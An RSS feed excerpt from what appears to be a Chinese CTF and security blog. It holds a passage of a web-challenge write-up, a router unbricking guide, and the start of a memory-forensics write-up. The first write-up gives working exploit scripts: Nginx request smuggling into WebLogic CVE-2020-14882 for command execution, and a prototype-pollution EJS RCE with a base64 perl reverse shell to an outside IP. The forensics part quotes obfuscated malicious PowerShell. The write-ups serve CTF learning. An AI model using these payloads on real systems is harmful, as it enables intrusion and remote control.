index.php;</span><br><span class="line">           <span class="attribute">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">           <span class="attribute">include</span>        fastcgi_params;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">resolver</span> <span class="number">127.0.0.11</span> valid=<span class="number">0s</span> ipv6=<span class="literal">off</span>;</span><br><span class="line"><span class="attribute">resolver_timeout</span> <span class="number">10s</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># weblogic</span></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line"><span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line"><span class="attribute">server_name</span>  weblogic;</span><br><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line"><span class="attribute">proxy_set_header</span> Host $host;</span><br><span class="line"><span class="attribute">set</span> $backend weblogic;</span><br><span class="line"><span class="attribute">proxy_pass</span> http://$backend:7001;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现确实在内网有 host 为 weblogic 的服务，但是没有提供可 SSRF 的位置。可以发现服务端使用的 Nginx 版本为 1.17.6，而 Ngnix &lt; 1.17.7 存在请求走私的漏洞，因此进行尝试。</p><h4 id="请求走私"><a href="#请求走私" class="headerlink" title="请求走私"></a>请求走私</h4><p>使用如下载荷走私到 WebLogic Console 的登录页面。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/undefined</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node4.buuoj.cn:28946</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">GET /console/login/LoginForm.jsp HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>weblogic</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在响应中可以看到如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebLogic Server Version: 12.2.1.4.0</span><br></pre></td></tr></table></figure><p>这个版本正好在 <code>CVE-2020-14882</code> 的范围内，除此之外尝试用 <code>CVE-2021-2109</code> 去攻击但没有成功，步骤停在了 redirecting。写出如下脚本来进行攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">sSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sSocket.connect((<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26319</span>))</span><br><span class="line">payload = <span class="string">b&#x27;&#x27;&#x27;HEAD / HTTP/1.1\r\nHost: node4.buuoj.cn\r\n\r\nGET /console/css/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]&#123;%22cmd.exe%22,%20%22/c%22,%20cmd&#125;%20:%20new%20String[]&#123;%22/bin/sh%22,%20%22-c%22,%20cmd&#125;;if(cmd%20!=%20null%20)&#123;%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();&#125;%20currentThread.interrupt(); HTTP/1.1\r\nHost:weblogic\r\ncmd: /readflag\r\n\r\n&#x27;&#x27;&#x27;</span></span><br><span class="line">sSocket.send(payload)</span><br><span class="line">sSocket.settimeout(<span class="number">2</span>)</span><br><span class="line">response = sSocket.recv(<span class="number">2147483647</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(response) &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(response.decode())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = sSocket.recv(<span class="number">2147483647</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">sSocket.close()</span><br></pre></td></tr></table></figure><p>运行脚本后可在响应中找到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ff176972-bf1c-49ff-b7b5-36ef338179a2&#125;</span><br></pre></td></tr></table></figure><h3 id="easynode"><a href="#easynode" class="headerlink" title="easynode"></a>easynode</h3><p>将附件源码解压，在 app.js 中可以发现如下过滤逻辑。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> safeQuery =  <span class="keyword">async</span> (username,password)=&gt;&#123;</span><br><span class="line">    <span class="keyword">const</span> waf = <span class="function">(<span class="params">str</span>)=&gt;</span>&#123;</span><br><span class="line">        blacklist = [<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>]</span><br><span class="line">        blacklist.forEach(<span class="function"><span class="params">element</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (str == element)&#123;</span><br><span class="line">                str = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> safeStr = <span class="function">(<span class="params">str</span>)=&gt;</span>&#123; <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i &lt; str.length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (waf(str[i]) ==<span class="string">&quot;*&quot;</span>)&#123;</span><br><span class="line">            str =  str.slice(<span class="number">0</span>, i) + <span class="string">&quot;*&quot;</span> + str.slice(i + <span class="number">1</span>, str.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    username = safeStr(username);</span><br><span class="line">    password = safeStr(password);</span><br><span class="line">    <span class="keyword">let</span> sql = format(<span class="string">&quot;select * from test where username = &#x27;&#123;&#125;&#x27; and password = &#x27;&#123;&#125;&#x27;&quot;</span>,username.substr(<span class="number">0</span>,<span class="number">20</span>),password.substr(<span class="number">0</span>,<span class="number">20</span>));</span><br><span class="line">    result = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(<span class="keyword">await</span> select(sql)));</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>waf</code> 方法里对几个字符进行了枚举比对，然后 <code>safeStr</code> 将被过滤的字符两端连接起来。此时，如果 <code>str</code> 是数组，且有一个元素为 <code>*</code>，就能将数组连接成字符串。因此 <code>waf</code> 方法的枚举过滤可以用足够长的数组来绕过，经过测试可以发现 <code>safeQuery([&quot;admin&#39;#&quot;,1,2,1,2,&quot;^&quot;],&quot;123&quot;)</code> 即可达成目的。将其转换为请求参数即可得到 admin 的 token。</p><p>在源码中可发现一个 test.js，其中测试了一个 ejs 的模板注入 RCE，在 <code>/admin</code> 路由下可找到对 board 的取用和渲染。而 board 是在 <code>/adminDIV</code> 路由下被存入的。</p><blockquote><p><a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/</a></p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> data)&#123;</span><br><span class="line">    <span class="keyword">var</span> addDIV =<span class="string">`&#123;&quot;<span class="subst">$&#123;username&#125;</span>&quot;:&#123;&quot;<span class="subst">$&#123;key&#125;</span>&quot;:&quot;<span class="subst">$&#123;(data[key])&#125;</span>&quot;&#125;&#125;`</span>;</span><br><span class="line">    <span class="comment">// __proto__:&#123;</span></span><br><span class="line">    <span class="comment">//     outputFunctionName: &#123;</span></span><br><span class="line">    <span class="comment">//         data[key]: evilCode</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    extend(&#123;&#125;,<span class="built_in">JSON</span>.parse(addDIV));</span><br><span class="line">    <span class="keyword">const</span> html = <span class="keyword">await</span> ejs.renderFile(__dirname + <span class="string">&quot;/public/admin.ejs&quot;</span>,&#123;addDIV,username&#125;)</span><br><span class="line">&#125;</span><br><span class="line">sql = <span class="string">`update board SET board = &#x27;<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(board)&#125;</span>&#x27; where username = &#x27;<span class="subst">$&#123;username&#125;</span>&#x27;`</span></span><br></pre></td></tr></table></figure><p>此时可以发现，假如 username 是 <code>__proto__</code>，那么此时导入的属性即可成功污染到 <code>__proto__.outputFunctionName</code>，从而触发模板注入的 RCE。因此首先要使用 <code>/addAdmin</code> 添加一个用户名为 <code>__proto__</code> 的用户，然后登录这个用户。再使用 <code>/adminDIV</code> 路由更改数据库中的 board，此时只需要传入参数名为 data 的一串恶意载荷即可，构造出如下脚本进行攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> httpx <span class="keyword">as</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.Client()</span><br><span class="line">URL = <span class="string">&quot;http://29cc0540-0d12-42f1-92c0-7f4e9694f50e.node4.buuoj.cn&quot;</span></span><br><span class="line"></span><br><span class="line">response = session.post(<span class="string">f&quot;<span class="subst">&#123;URL&#125;</span>/login&quot;</span>, data=&#123;</span><br><span class="line">    <span class="string">&quot;username[0]&quot;</span>: <span class="string">&quot;admin&#x27;#&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username[1]&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username[2]&quot;</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username[3]&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username[4]&quot;</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username[5]&quot;</span>: <span class="string">&quot;^&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;lemonPass&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line">token = json.loads(response.content.decode())[<span class="string">&quot;token&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] queried cookie token <span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br><span class="line">session.cookies.<span class="built_in">set</span>(<span class="string">&quot;token&quot;</span>, token)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Cookie set <span class="subst">&#123;session.cookies&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">response = session.post(<span class="string">f&quot;<span class="subst">&#123;URL&#125;</span>/addAdmin&quot;</span>, data=&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;__proto__&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;lemonPass&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] AddAdmin response is \&quot;<span class="subst">&#123;response.content.decode()&#125;</span>\&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">response = session.post(<span class="string">f&quot;<span class="subst">&#123;URL&#125;</span>/login&quot;</span>, data=&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;__proto__&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;lemonPass&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line">token = json.loads(response.content.decode())[<span class="string">&quot;token&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] queried __proto__ cookie token <span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br><span class="line">session.cookies.delete(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">session.cookies.<span class="built_in">set</span>(<span class="string">&quot;token&quot;</span>, token)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Cookie set <span class="subst">&#123;session.cookies&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">response = session.post(<span class="string">f&quot;<span class="subst">&#123;URL&#125;</span>/adminDIV&quot;</span>, data=&#123;</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: <span class="string">&#x27;&#x27;&#x27;&#123;&quot;outputFunctionName&quot;:&quot;x;process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iOC4xMzYuOC4yMTAiOyRwPTMyNTU7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307Jw==|base64 -d|bash&#x27;);x&quot;&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Inject evil code response is \&quot;<span class="subst">&#123;response.content.decode()&#125;</span>\&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">response = session.get(<span class="string">f&quot;<span class="subst">&#123;URL&#125;</span>/admin&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Triggered reverse shell&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626849290142742/61f01db3abd17f7cbf3d4c5d6d89a6498ad5a182.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;864760b9-8f84-4389-b904-38a1975af1f2&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>https://lemonprefect.cn/zh-CN/posts/751c0b7.html#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>使用 CH341A 编程器救砖斐讯 K2</title>
      <link>https://lemonprefect.cn/zh-CN/posts/fbc679d5.html</link>
      <guid>https://lemonprefect.cn/zh-CN/posts/fbc679d5.html</guid>
      <pubDate>Sat, 17 Jul 2021 16:30:12 GMT</pubDate>
      
      <description>&lt;h2 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h2&gt;&lt;p&gt;偶然的机会拿到了两台斐讯 K2，本来计划着把原本的 Pandvan 刷成 OpenWRT，奈何 K2 的 64M 内存大概是顶不住 &lt;a href=&quot;https://github.com/garypang13&quot;&gt;@Garypang&lt;/a&gt;  大佬编译好的固件，又不想自己编译折腾，索性就更新一波原本的固件。备份 EEPROM、更新路由器固件和 breed 的过程十分顺利，然重启之后路由器就直接变成了交换机。隐约感觉到是 breed 没了，重启了几次后火速下单了编程器准备硬刷 EEPROM 了。&lt;/p&gt;
&lt;p&gt;&lt;escape&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h2><p>偶然的机会拿到了两台斐讯 K2，本来计划着把原本的 Pandvan 刷成 OpenWRT，奈何 K2 的 64M 内存大概是顶不住 <a href="https://github.com/garypang13">@Garypang</a>  大佬编译好的固件，又不想自己编译折腾，索性就更新一波原本的固件。备份 EEPROM、更新路由器固件和 breed 的过程十分顺利，然重启之后路由器就直接变成了交换机。隐约感觉到是 breed 没了，重启了几次后火速下单了编程器准备硬刷 EEPROM 了。</p><p><escape><span id="more"></span></escape></p><h2 id="动手"><a href="#动手" class="headerlink" title="动手"></a>动手</h2><p>刷机五分钟，拆机两小时，撬棒一定要准备好，一字螺丝刀也可以。注意拆机的时候将路由器断电。CH341A 编程器和 SOP8 的夹子，如果没有夹子的话就得把芯片焊下来写入再焊回去。卸下路由器背面贴纸下的两个螺丝，使用撬棒对付卡扣，可以将路由器拆开。</p><p>将线的一段插到板子上，注意板子上的数字，对应线的插口上的两个数字的顺序。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/bcd1e494-d526-4ad9-aa35-31dc34ee3fxu/1626536464896/3743d4ac761ba3fd5277c85fcae6b7821b0012e9.png"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/bcd1e494-d526-4ad9-aa35-31dc34ee3fxu/1626536492167/749febe00b86ba688525073f7c25229bad0a42de.png"></p><p>将板子插到编程器的靠后的位置上（如果插到前面的位置上会由于芯片的型号不对而读不到芯片）。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/bcd1e494-d526-4ad9-aa35-31dc34ee3fxu/1626536598475/191bf4643c76d8f27fafe7b35df97cd1752432ee.png"></p><p>将编程器接入电脑，此时将会看到名为 USB UART-LPT 的没有驱动的设备。此时运行驱动安装程序，顺利的话将看到设备变为 USB-SERIAL CH341A。此时在路由器的主板上找到芯片的位置，将夹子对着引脚夹上去，保证夹子牢固。如果夹子的正反正确，路由器的指示灯将亮起为橘红色。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/bcd1e494-d526-4ad9-aa35-31dc34ee3fxu/1626536969980/fe1d450f8f788928b01971e08602178301f97dc2.png"></p><p>以管理员身份运行 AsProgrammer 程序， 点击芯片检测图标，可以检测到容量为 8388608 的 W25Q64BV 芯片。先使用读入的功能将其上原本的内容备份保存到计算机中。然后打开从 <a href="https://breed.hackpascal.net/">https://breed.hackpascal.net/</a> 下载好的 breed 固件，将其写入芯片中。最好勾选写入选项下的校验，如果此时执行失败，可以尝试点一次擦除，再终止操作，此时可能可以成功写入。当看到下图的时候便是写入固件成功。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/bcd1e494-d526-4ad9-aa35-31dc34ee3fxu/1626537357305/a5d880d6514cb7fc005554102b08cc623dae74c4.png"></p><p>将夹子松开，给路由器插上电源，给电脑插上 LAN 口的网线，即可用 192.168.1.1 进入到 breed 中。将备份的 EEPROM 恢复。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/bcd1e494-d526-4ad9-aa35-31dc34ee3fxu/1626537502775/2269e4f2af3be3051d00fc8c475895efa1627334.png"></p><p>恢复完成后点 MAC 地址修改，观察到其不再是默认值即恢复成功。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/bcd1e494-d526-4ad9-aa35-31dc34ee3fxu/1626537565373/02cb4ac024b5cb28d610ede1c536367e02682218.png"></p><p>接下来回到 breed 的固件更新选项中给路由器重新刷入 Pandvan 即可。这里附上我使用的<a href="https://1drv.ms/u/s!Aqe9Z34waQq1k3k5VY6sQB3oGLOA?e=hbBgBD">工具集</a>。</p>]]></content:encoded>
      
      
      <category domain="https://lemonprefect.cn/categories/StudyNote/">StudyNote</category>
      
      
      <category domain="https://lemonprefect.cn/tags/Skill/">Skill</category>
      
      
      <comments>https://lemonprefect.cn/zh-CN/posts/fbc679d5.html#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>强网杯 2021</title>
      <link>https://lemonprefect.cn/zh-CN/posts/1ff2873c.html</link>
      <guid>https://lemonprefect.cn/zh-CN/posts/1ff2873c.html</guid>
      <pubDate>Mon, 14 Jun 2021 11:00:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerlink&quot; title=&quot;Misc&quot;&gt;&lt;/a&gt;Misc&lt;/h2&gt;&lt;h3 id=&quot;BlueTeaming&quot;&gt;&lt;a href=&quot;#BlueTeaming&quot; class=&quot;headerlink&quot; title=&quot;BlueTeaming&quot;&gt;&lt;/a&gt;BlueTeaming&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;Powershell scripts were executed by malicious programs. What is the registry key that contained the power</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="BlueTeaming"><a href="#BlueTeaming" class="headerlink" title="BlueTeaming"></a>BlueTeaming</h3><blockquote><p>Powershell scripts were executed by malicious programs. What is the registry key that contained the power shellscript content?</p></blockquote><p>将附件解压后 file 一次可得其仍然是个 7z 文件，再次解压后得到 dump 文件。使用 volatility 探测 profile。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">lemonprefect@LAPTOP-3E49IU3M:/mnt/f/ghrepos/volatility2$ python2 vol.py -f memory.dmp imageinfo</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418</span><br><span class="line">                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (/mnt/f/ghrepos/volatility2/memory.dmp)</span><br><span class="line">                      PAE <span class="built_in">type</span> : No PAE</span><br><span class="line">                           DTB : 0x187000L</span><br><span class="line">                          KDBG : 0xf80002be3120L</span><br><span class="line">          Number of Processors : 1</span><br><span class="line">     Image Type (Service Pack) : 1</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 0 : 0xfffff80002be5000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xfffff78000000000L</span><br><span class="line">           Image date and time : 2020-11-26 13:00:41 UTC+0000</span><br><span class="line">     Image <span class="built_in">local</span> date and time : 2020-11-26 22:00:41 +0900</span><br></pre></td></tr></table></figure><p>取其 profile 为 <code>Win7SP1x64</code>，使用 hivelist 列出注册表。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">lemonprefect@LAPTOP-3E49IU3M:/mnt/f/ghrepos/volatility2$ python2 vol.py -f memory.dmp --profile=Win7SP1x64 hivelist</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Virtual            Physical           Name</span><br><span class="line">------------------ ------------------ ----</span><br><span class="line">0xfffff8a00000f010 0x00000000a9107010 [no name]</span><br><span class="line">0xfffff8a000024010 0x00000000a9612010 \REGISTRY\MACHINE\SYSTEM</span><br><span class="line">0xfffff8a000057410 0x00000000a9745410 \REGISTRY\MACHINE\HARDWARE</span><br><span class="line">0xfffff8a0001052e0 0x00000000595002e0 \SystemRoot\System32\Config\DEFAULT</span><br><span class="line">0xfffff8a0002d7010 0x00000000a103c010 \SystemRoot\System32\Config\SOFTWARE</span><br><span class="line">0xfffff8a000347010 0x00000000a57be010 \Device\HarddiskVolume1\Boot\BCD</span><br><span class="line">0xfffff8a00200e010 0x0000000081c17010 \SystemRoot\System32\Config\SECURITY</span><br><span class="line">0xfffff8a00203a010 0x0000000081a77010 \SystemRoot\System32\Config\SAM</span><br><span class="line">0xfffff8a002149010 0x0000000081565010 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT</span><br><span class="line">0xfffff8a0021d5010 0x0000000081255010 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT</span><br><span class="line">0xfffff8a002ae4410 0x000000007d278410 \??\C:\Windows\System32\config\COMPONENTS</span><br><span class="line">0xfffff8a00891f010 0x000000006f172010 \??\C:\System Volume Information\Syscache.hve</span><br><span class="line">0xfffff8a0089ff010 0x0000000075c42010 \??\C:\Users\nyong\ntuser.dat</span><br><span class="line">0xfffff8a008bf1010 0x000000002b8a7010 \??\C:\Windows\AppCompat\Programs\Amcache.hve</span><br><span class="line">0xfffff8a008e1b010 0x0000000061e3c010 \??\C:\Users\nyong\AppData\Local\Microsoft\Windows\UsrClass.dat</span><br></pre></td></tr></table></figure><p>使用如下指令将注册表全部导出。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f memory.dmp --profile Win7SP1x64 dumpregistry -D /mnt/f/CTFs/2021/qwb/</span><br></pre></td></tr></table></figure><p>使用 Windows 自带的 Regedit 加载配置单元挂载文件 <code>registry.0xfffff8a0002d7010.SOFTWARE.reg</code>，可以在 <code>计算机\HKEY_LOCAL_MACHINE\IMPORTED\Microsoft\Windows\Communication</code> 下找到 code，其内容为如下恶意代码。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; ( <span class="variable">$veRBOsepReFErEncE</span>.tOstrINg()[<span class="number">1</span>,<span class="number">3</span>]+<span class="string">&#x27;x&#x27;</span><span class="operator">-JOin</span><span class="string">&#x27;&#x27;</span>)( <span class="built_in">nEW-ObjEcT</span> 